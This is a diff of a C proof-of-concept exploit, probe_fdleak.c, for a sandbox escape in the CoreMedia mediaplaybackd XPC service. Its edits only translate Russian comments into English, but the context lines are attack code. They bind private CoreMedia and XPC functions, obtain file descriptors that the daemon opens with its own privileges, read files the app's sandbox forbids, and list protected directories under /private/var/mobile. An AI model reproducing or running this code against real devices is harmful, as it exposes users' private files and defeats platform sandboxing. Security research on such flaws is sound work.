@@ -1,14 +1,14 @@
 /*
  * probe_fdleak.c — CVE-2026-112706: CoreMedia mediaplaybackd bytestream XPC, fd vend.
  *
- * mediaplaybackd открывает клиентский file:// путь СВОИМИ правами и отдаёт живой fd
- * в ByteStreamDetails.FileDescriptor. I/O по дескриптору не проходит проверки путей
- * песочницы клиента -> файл, который приложение не может open(), читается.
+ * mediaplaybackd opens a client-supplied file:// path with ITS OWN privileges and returns
+ * a live fd in ByteStreamDetails.FileDescriptor. I/O on that descriptor bypasses the
+ * client's sandbox path checks -> a file the app cannot open() becomes readable.
  *
- * Handshake: '.rp1' -> '.rp2' (memory recipient) -> '.org' (memory origin), затем
- * 'Curl' create с CreationURL. Всё через dlsym: CoreMedia (Fig*) + libxpc.
+ * Handshake: '.rp1' -> '.rp2' (memory recipient) -> '.org' (memory origin), then a
+ * 'Curl' create with CreationURL. Everything via dlsym: CoreMedia (Fig*) + libxpc.
  *
- * Отчёт: syslog + <HOME>/Documents/probe_fdleak.log
+ * Output: syslog + <HOME>/Documents/probe_fdleak.log
  */
 
 /* uint types — avoid size_t conflict with SDK headers */
@@ -51,7 +51,7 @@ extern int mkdir(const char *, unsigned int);
 #define O_CREAT 0x0200
 #define O_APPEND 0x0008   /* Darwin: O_NONBLOCK=0x4 */
 
-/* Fig* ABI (из FdLeak.swift / Cinder27) */
+/* Fig* ABI (from FdLeak.swift / Cinder27) */
 typedef int32_t (*fn_basic_msg)(uint32_t, uint64_t, void **);
 typedef int32_t (*fn_origin_begin)(void *);
 typedef int32_t (*fn_origin_complete)(void *, void **);
@@ -183,7 +183,7 @@ static void *g_reply_obj;
 
 static void *send_msg(void *conn, void *msg) {
     if (!msg) return NULL;
-    /* синхронный вариант теперь безопасен: прогон идёт на отдельном потоке */
+    /* the synchronous variant is safe now: the run happens on its own thread */
     if (p_send_sync) {
         void *reply = p_send_sync(conn, msg);
         if (reply) return reply;
@@ -312,7 +312,7 @@ static vend_t vend(void *conn, const char *path) {
     p_release(reply);
     if (fd < 0) { v.error_code = -994; return v; }
 
-    /* fstat без заголовков: только st_mode (offset 4) и st_size (offset 104 на arm64 Darwin) */
+    /* fstat without headers: only st_mode (offset 4) and st_size (offset 104 on arm64 Darwin) */
     uint8_t stbuf[256];
     for (unsigned i = 0; i < sizeof(stbuf); i++) stbuf[i] = 0;
     if (fstat(fd, stbuf) == 0) {
@@ -359,7 +359,7 @@ static void *probe_thread(void *arg) {
     const char *sfx = "/Documents/probe_fdleak.log";
     for (unsigned long k = 0; sfx[k]; k++) g_log[i++] = sfx[k];
     g_log[i] = 0;
-    unlink(g_log);   /* свой лог чистим сами: house_arrest rm ненадёжен */
+    unlink(g_log);   /* we clear our own log: house_arrest rm is unreliable */
 
     report("fdleak: start t=%llu", mach_absolute_time());
     if (!bind_all()) { report("fdleak: bind failed"); g_rc = 1; return NULL; }
@@ -386,7 +386,7 @@ static void *probe_thread(void *arg) {
     for (unsigned t = 0; t < sizeof(g_targets) / sizeof(g_targets[0]); t++) {
         const target_t *tg = &g_targets[t];
 
-        /* контроль: наш собственный open() должен быть отвергнут */
+        /* control: our own open() must be refused */
         int e = 0;
         int cfd = open(tg->path, O_RDONLY, 0);
         if (cfd >= 0) { close(cfd); e = 0; } else { e = *__error(); }
@@ -433,7 +433,7 @@ static void *probe_thread(void *arg) {
         }
     }
 
-    /* перечисление каталогов через венднутый fd */
+    /* directory listing through the vended fd */
     static const char *dirs[] = {
         "/private/var/mobile/Media",
         "/private/var/mobile/Library",
